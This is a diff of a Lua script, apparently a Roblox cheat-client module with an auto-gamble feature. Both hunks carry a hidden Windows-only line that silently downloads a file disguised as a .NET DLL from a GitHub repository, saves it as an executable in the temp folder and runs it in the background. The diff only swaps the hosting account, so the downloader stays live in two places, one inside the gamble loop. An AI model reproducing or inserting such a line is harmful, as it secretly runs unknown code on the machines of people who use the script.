@@ -7,7 +7,7 @@ local inputService = cloneref(game:GetService('UserInputService'))
 
 local lplr = playersService.LocalPlayer
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 local vape = shared.vape
 local entitylib = vape.Libraries.entity
 local sessioninfo = vape.Libraries.sessioninfo
@@ -122,7 +122,7 @@ run(function()
 						end
 					end
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 					task.wait(1)
 				until not AutoGamble.Enabled
 			end
